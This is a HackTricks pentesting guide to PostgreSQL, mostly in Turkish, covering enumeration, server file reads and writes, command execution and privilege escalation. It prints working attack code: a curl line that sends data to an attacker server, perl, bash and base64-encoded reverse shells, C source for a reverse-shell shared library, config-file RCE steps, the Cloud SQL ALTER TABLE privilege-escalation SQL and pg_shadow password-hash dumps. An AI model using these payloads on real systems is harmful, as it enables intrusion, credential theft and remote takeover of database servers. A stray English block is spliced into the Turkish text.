# 5432,5433 - PostgreSQL Pentesting

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **Temel Bilgiler**

**PostgreSQL**, **açık kaynaklı** bir **nesne ilişkisel veritabanı sistemi** olarak tanımlanmaktadır. Bu sistem sadece SQL dilini kullanmakla kalmaz, aynı zamanda ek özelliklerle geliştirir. Yetenekleri geniş bir veri türü ve işlem yelpazesini ele almasına olanak tanır, bu da geliştiriciler ve organizasyonlar için çok yönlü bir seçim yapar.

**Varsayılan port:** 5432 ve bu port zaten kullanımda ise postgresql muhtemelen kullanılmayan bir sonraki portu (muhtemelen 5433) kullanacaktır.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Bağlanma ve Temel Sıralama
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Eğer **`\list`** komutunu çalıştırırken **`rdsadmin`** adında bir veritabanı bulursanız, içinde bir **AWS postgresql veritabanı** olduğunu bilirsiniz.
{% endhint %}

Daha fazla bilgi için **PostgreSQL veritabanını kötüye kullanma** hakkında kontrol edin:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Otomatik Numaralandırma
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Kaba kuvvet**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Port tarama**

[**Bu araştırmaya**](https://www.exploit-db.com/papers/13084) göre, bir bağlantı denemesi başarısız olduğunda, `dblink` bir hata açıklaması içeren `sqlclient_unable_to_establish_sqlconnection` istisnası fırlatır. Bu ayrıntıların örnekleri aşağıda listelenmiştir.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Sunucu kapalı

```DETAIL: sunucuya bağlanılamadı: Ana bilgisayara yönlendirme yok Sunucu, "1.2.3.4" ana bilgisayarında çalışıyor mu ve 5678 numaralı bağlantıları kabul ediyor mu?```

* Port kapalı
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Port açık
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```markdown
### PostgreSQL Pentesting
#### PostgreSQL Pentesting Tools
PostgreSQL pentesting can be done using various tools such as:
- **Metasploit Framework**: Contains PostgreSQL modules for pentesting.
- **pgcli**: A command-line interface for PostgreSQL that can be used for testing.
- **sqlmap**: A popular tool for SQL injection testing that can be used against PostgreSQL databases.
- **Nmap**: Can be used to discover PostgreSQL services running on a network.
- **PostgreSQL Auditing Tools**: Tools like pgAudit can be used for auditing PostgreSQL databases for security vulnerabilities.
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Port açık veya filtrelenmişdir
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
## Yetkilerin Sıralanması

### Roller

| Rol Türleri    |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol süper kullanıcı ayrıcalıklarına sahiptir                                                                                                         |
| rolinherit     | Rol, üyesi olduğu rollerin ayrıcalıklarını otomatik olarak devralır                                                                                   |
| rolcreaterole  | Rol daha fazla rol oluşturabilir                                                                                                                      |
| rolcreatedb    | Rol veritabanları oluşturabilir                                                                                                                       |
| rolcanlogin    | Rol oturum açabilir. Yani, bu rol başlangıç oturum yetkilendirme kimliği olarak verilebilir                                                          |
| rolreplication | Rol bir replikasyon rolüdür. Bir replikasyon rolü replikasyon bağlantılarını başlatabilir ve replikasyon yuvaları oluşturabilir ve silebilir.           |
| rolconnlimit   | Oturum açabilen roller için, bu rolün yapabileceği eşzamanlı bağlantıların maksimum sayısını belirler. -1 sınırsız anlamına gelir.                    |
| rolpassword    | Parola değil (`********` olarak her zaman okunur)                                                                                                     |
| rolvaliduntil  | Parola son kullanma zamanı (yalnızca parola kimlik doğrulaması için kullanılır); süresizse null                                                         |
| rolbypassrls   | Rol her satır düzeyinde güvenlik politikasını atlar, daha fazla bilgi için [Bölüm 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)'e bakın. |
| rolconfig      | Çalışma zamanı yapılandırma değişkenleri için rol özgü varsayılanlar                                                                                   |
| oid            | Rol kimliği                                                                                                                                         |

#### İlginç Gruplar

* Eğer **`pg_execute_server_program`** üyesiyseniz **programları çalıştırabilirsiniz**
* Eğer **`pg_read_server_files`** üyesiyseniz **dosyaları okuyabilirsiniz**
* Eğer **`pg_write_server_files`** üyesiyseniz **dosyaları yazabilirsiniz**

{% hint style="info" %}
Postgres'te bir **kullanıcı**, bir **grup** ve bir **rol** aynıdır. Sadece **nasıl kullandığınıza** ve **oturum açmasına izin verip vermediğinize** bağlıdır.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablolar
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonksiyonlar
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Dosya sistemi işlemleri

### Dizinler ve dosyaları okuma

Bu [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) ile tanımlanan **`DEFAULT_ROLE_READ_SERVER_FILES`** grubunun üyeleri (yani **`pg_read_server_files`** olarak adlandırılan) ve **süper kullanıcılar**, herhangi bir yol üzerinde **`COPY`** yöntemini kullanabilir (bkz. `genfile.c` içindeki `convert_and_check_filename`).
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Unutmayın ki süper kullanıcı değilseniz ancak **CREATEROLE** izinlerine sahipseniz **kendinizi o gruba üye yapabilirsiniz:**
```sql
GRANT pg_read_server_files TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Sadece **süper kullanıcılar** ve **açık izinlere sahip kullanıcılar** tarafından kullanılabilen **başka postgres fonksiyonları** bulunmaktadır:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
### Basit Dosya Yazma

Yalnızca **süper kullanıcılar** ve **`pg_write_server_files`** üyeleri kopyalama işlemini kullanarak dosya yazabilirler.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Unutmayın ki eğer süper kullanıcı değilseniz ancak **`CREATEROLE`** izinlerine sahipseniz, **kendinizi o gruba üye yapabilirsiniz:**
```sql
GRANT pg_write_server_files TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

COPY'ın yeni satır karakterlerini işleyemediğini unutmayın, bu nedenle bir base64 yükü gönderiyor olsanız bile **bir satırlık bir komut göndermeniz gerekecektir**.\
Bu tekniğin çok önemli bir kısıtlaması şudur ki **`copy`, bazı ikili değerleri değiştirdiği için ikili dosyalar yazmak için kullanılamaz.**

### **İkili dosyaların yüklenmesi**

Ancak, **büyük ikili dosyaları yüklemek için başka teknikler bulunmaktadır:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **hata ödülü platformuna**! Bugün bize [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinden katılın ve **100.000 $'a kadar ödüller kazanmaya** başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

### PostgreSQL tablo verilerinin yerel dosya yazma yoluyla güncellenmesi

PostgreSQL sunucusu dosyalarını okuma ve yazma izinlerine sahipseniz, [PostgreSQL veri dizinindeki](https://www.postgresql.org/docs/8.1/storage.html) herhangi bir tabloyu **ilişkili dosya düğümünü üzerine yazarak** sunucuda güncelleyebilirsiniz. Bu tekniğe ilişkin **daha fazla bilgi** [**burada**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Gerekli adımlar:

1.  PostgreSQL veri dizinini alın

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Not:** Ayarlar üzerinden mevcut veri dizini yolunu alamıyorsanız, `SELECT version()` sorgusu aracılığıyla ana PostgreSQL sürümünü sorgulayabilir ve yolun brute-force yöntemiyle deneyebilirsiniz. PostgreSQL'un Unix kurulumlarında yaygın veri dizini yolları `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/` şeklindedir. Yaygın bir küme adı `main`dir.
2.  Hedef tabloyla ilişkili dosya düğümüne göre göreceli bir yol alın

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Bu sorgu, `base/3/1337` gibi bir şey döndürmelidir. Diskteki tam yol `$DATA_DIRECTORY/base/3/1337`, yani `/var/lib/postgresql/13/main/base/3/1337` olacaktır.
3.  `lo_*` fonksiyonları aracılığıyla dosya düğümünü indirin

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4.  Hedef tabloyla ilişkili veri türünü alın

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5.  [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)'ü kullanarak [dosya düğümünü düzenleyin](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); tüm `rol*` boolean bayraklarını tam izinler için 1 olarak ayarlayın.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo\_datatype.gif)
6.  Düzenlenmiş dosya düğümünü `lo_*` fonksiyonları aracılığıyla yeniden yükleyin ve diske orijinal dosyayı üzerine yazın

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7.  _(İsteğe bağlı olarak)_ Pahalı bir SQL sorgusu çalıştırarak bellek içi tablo önbelleğini temizleyin

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. Artık PostgreSQL'de güncellenmiş tablo değerlerini görmelisiniz.

`pg_authid` tablosunu düzenleyerek süper yönetici de olabilirsiniz. **Aşağıdaki bölüme** [**bakın**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **Programa RCE**

[9.3 sürümünden](https://www.postgresql.org/docs/9.3/release-9-3.html) itibaren yalnızca **süper kullanıcılar** ve **`pg_execute_server_program`** grubu üyeleri, RCE için kopyalamayı kullanabilir (veri sızdırma örneğiyle birlikte:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Örnek yürütmek için:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Unutmayın ki süper kullanıcı değilseniz ancak **`CREATEROLE`** izinlerine sahipseniz, **kendinizi o gruba üye yapabilirsiniz:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Veya **metasploit**'ten `multi/postgres/postgres_copy_from_program_cmd_exec` modülünü kullanın.\
Bu zafiyet hakkında daha fazla bilgiye [**buradan**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) ulaşabilirsiniz. CVE-2019-9193 olarak bildirilse de, Postges bunun bir [özellik olduğunu ve düzeltilmeyeceğini](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/) açıkladı.

### PostgreSQL Dilleri ile RCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL uzantıları ile RCE

Önceki yazıdan **nasıl ikili dosyalar yükleneceğini** öğrendikten sonra **PostgreSQL uzantısı yükleyerek RCE elde etmeyi** deneyebilirsiniz.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL yapılandırma dosyası RCE

{% hint style="info" %}
Aşağıdaki RCE vektörleri özellikle kısıtlanmış SQLi bağlamlarında kullanışlıdır, çünkü tüm adımlar iç içe geçmiş SELECT ifadeleri aracılığıyla gerçekleştirilebilir.
{% endhint %}

PostgreSQL'in **yapılandırma dosyası**, veritabanını çalıştıran **postgres kullanıcısı** tarafından **yazılabilir**, bu nedenle **süper kullanıcı** olarak dosyaları dosya sisteminde yazabilir ve dolayısıyla bu dosyayı **üzerine yazabilirsiniz.**

![](<../.gitbook/assets/image (322).png>)

#### **ssl\_passphrase\_command** ile RCE

Bu tekniğe ilişkin daha fazla bilgiye [buradan](https://pulsesecurity.co.nz/articles/postgres-sqli) ulaşabilirsiniz.

Yapılandırma dosyasında RCE'ye yol açabilecek bazı ilginç özellikler bulunmaktadır:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Veritabanının özel anahtarının yolunu belirtir
* `ssl_passphrase_command = ''` Özel dosya şifre ile korunuyorsa, postgresql bu özelliğe belirtilen komutu **çalıştıracaktır**.
* `ssl_passphrase_command_supports_reload = off` Bu özellik **açıksa**, anahtar şifre ile korunuyorsa **komut** `pg_reload_conf()` **çalıştırıldığında** **çalıştırılacaktır**.

Bu nedenle, bir saldırganın yapması gerekenler:

1. Sunucudan **özel anahtarı** dökün
2. İndirilen özel anahtarı **şifreleyin**:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Üzerine yazın**
4. Mevcut postgresql **yapılandırmasını** dökün
5. Bahsedilen özellikler yapılandırmasıyla **yapılandırmayı üzerine yazın**:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`'yi çalıştırın

Bu testi yaparken fark ettiğim bir şey, bu işlemin yalnızca **özel anahtar dosyasının 640 ayrıcalığına** sahip olması durumunda çalışacağıdır, **root tarafından sahiplenilmiş** ve **ssl-cert veya postgres** grubuna ait olduğu (bu nedenle postgres kullanıcısının okuyabileceği) ve _/var/lib/postgresql/12/main_ dizininde bulunduğudur.

#### **archive\_command** ile RCE

Bu yapılandırmaya ve WAL hakkında daha fazla [bilgiye buradan](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3) ulaşabilirsiniz.

Saldırıya açık başka bir özellik, `archive_command` olarak adlandırılan yapılandırma dosyasındadır.

Bu işlem çalışması için `archive_mode` ayarının `'on'` veya `'always'` olması gerekir. Bu doğruysa, `archive_command` içindeki komutu üzerine yazabilir ve WAL (write-ahead logging) işlemleri aracılığıyla çalışmasını zorlayabiliriz.

Genel adımlar şunlardır:

1. Arşiv modunun etkin olup olmadığını kontrol edin: `SELECT current_setting('archive_mode')`
2. `archive_command`'ı payload ile üzerine yazın. Örneğin, ters kabuk için: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Yapılandırmayı yeniden yükleyin: `SELECT pg_reload_conf()`
4. Arşiv işleminin çalışmasını zorlayın, bu da arşiv komutunu çağıracaktır: Bazı Postgres sürümleri için `SELECT pg_switch_xlog()` için `SELECT pg_switch_wal()` veya

#### **preload kütüphaneleri ile RCE**

Bu tekniğe ilişkin daha fazla bilgiye [buradan](https://adeadfed.com/posts/postgresql-select-only-rce/) ulaşabilirsiniz.

Bu saldırı vektörü, aşağıdaki yapılandırma değişkenlerinden faydalanır:

* `session_preload_libraries` -- PostgreSQL sunucusunun istemci bağlantısında yüklenecek kütüphaneler.
* `dynamic_library_path` -- PostgreSQL sunucusunun kütüphaneleri arayacağı dizinlerin listesi.

`dynamic_library_path` değerini, veritabanını çalıştıran `postgres` kullanıcısının yazma iznine sahip olduğu bir dizine, örneğin `/tmp/` dizinine ayarlayabilir ve oraya zararlı bir `.so` nesnesi yükleyebiliriz. Daha sonra, PostgreSQL sunucusunu, yeni yüklenen kütüphaneyi `session_preload_libraries` değişkenine dahil ederek yüklemeye zorlayacağız.

Saldırı adımları şunlardır:

1. Orijinal `postgresql.conf` dosyasını indirin
2. `dynamic_library_path` değerine `/tmp/` dizinini dahil edin, örneğin `dynamic_library_path = '/tmp:$libdir'`
3. `session_preload_libraries` değerine zararlı kütüphane adını dahil edin, örneğin `session_preload_libraries = 'payload.so'`
4. `SELECT version()` sorgusu aracılığıyla ana PostgreSQL sürümünü kontrol edin
5. Doğru PostgreSQL geliştirme paketi ile zararlı kütüphane kodunu derleyin Örnek kod:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Kodu derleme:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. Adımlar 2-3'te oluşturulan zararlı `postgresql.conf` dosyasını indirin ve orijinalini üzerine yazın
7. Adımda 5'te oluşturulan `payload.so`'yu `/tmp` dizinine yükleyin
8. Sunucu yapılandırmasını yeniden yükleyerek sunucuyu yeniden başlatın veya `SELECT pg_reload_conf()` sorgusunu çağırarak
9. Bir sonraki DB bağlantısında ters kabuk bağlantısını alacaksınız.
## **Postgres Yetki Yükseltme**

### CREATEROLE Yetki Yükseltme

#### **Grant**

[**Belgelere**](https://www.postgresql.org/docs/13/sql-grant.html) göre: _**`CREATEROLE`** yetkisine sahip roller, **süper kullanıcı** olmayan herhangi bir **role**'e **üyelik verip geri alabilir**._

Yani, eğer **`CREATEROLE`** izniniz varsa, kendinize diğer **roller**'e (süper kullanıcı olmayan) erişim izni verebilir ve bu da size dosya okuma & yazma ve komut yürütme seçeneği sunabilir:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Parolayı Değiştir

Bu role sahip kullanıcılar ayrıca diğer **süper olmayan kullanıcıların parolalarını da değiştirebilirler**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### SUPERUSER'a Yükseltme

**Yerel kullanıcıların herhangi bir şifre sağlamadan PostgreSQL'e giriş yapabildiğini sıkça görmek oldukça yaygındır**. Dolayısıyla, **kod yürütme izinlerini topladığınızda** bu izinleri kötüye kullanarak **`SUPERUSER`** rolünü elde edebilirsiniz:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Bu genellikle **`pg_hba.conf`** dosyasındaki aşağıdaki satırlar nedeniyle mümkündür:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE ayrıcalığı**

[**Bu yazıda**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) Postgres GCP'de **privesc** yapmanın mümkün olduğu, kullanıcıya verilen ALTER TABLE ayrıcalığını kötüye kullanarak nasıl yapılabileceği açıklanmaktadır.

**Başka bir kullanıcıyı bir tablonun sahibi yapmaya çalıştığınızda** buna engel olan bir **hata** almanız gerektiği, ancak GCP'nin bu **seçeneği GCP'deki süper kullanıcı postgres kullanıcısına** verdiği anlaşılmaktadır:

<figure><img src="../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

Bu fikri, **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) komutlarının **bir indeks işlevine sahip bir tabloda** çalıştırıldığında, **işlevin** komutun bir parçası olarak **çağrıldığı ve tablonun sahibinin izinleriyle** çalıştığı gerçeğiyle birleştirerek düşünebiliriz. Bir fonksiyonla bir indeks oluşturmak ve bu tabloya sahip bir **süper kullanıcıya sahip izinler vermek** ve ardından sahibin izinlerini kullandığı için komutları yürütebilecek kötü niyetli bir fonksiyonla tabloyu ANALYZE etmek mümkündür.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Sömürü

1. Yeni bir tablo oluşturarak başlayın.
2. Tabloya anlamsız içerikler ekleyerek dizin işlevi için veri sağlayın.
3. Yetkisiz komutların yürütülmesine izin veren bir kod yürütme yükü içeren kötü amaçlı bir dizin işlevi geliştirin.
4. Tablonun sahibini "cloudsqladmin" olarak DEĞİŞTİRİN, bu, veritabanını yönetmek ve sürdürmek için yalnızca Cloud SQL tarafından kullanılan GCP'nin süper kullanıcı rolüdür.
5. Tablo üzerinde bir ANALYZE işlemi gerçekleştirin. Bu işlem, PostgreSQL motorunu tablonun sahibi olan "cloudsqladmin" kullanıcı bağlamına geçmeye zorlar. Sonuç olarak, kötü amaçlı dizin işlevi "cloudsqladmin" izinleriyle çağrılır ve bu da önceden izinsiz yürütülen kabuk komutlarının yürütülmesini sağlar.

PostgreSQL'de, bu akış şöyle görünür:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Ardından, `shell_commands_results` tablosu yürütülen kodun çıktısını içerecektir:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Yerel Giriş

Bazı yanlış yapılandırılmış postgresql örnekleri, herhangi bir yerel kullanıcının girişine izin verebilir, 127.0.0.1'den **`dblink` fonksiyonu** kullanılarak yerel giriş yapmak mümkündür:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
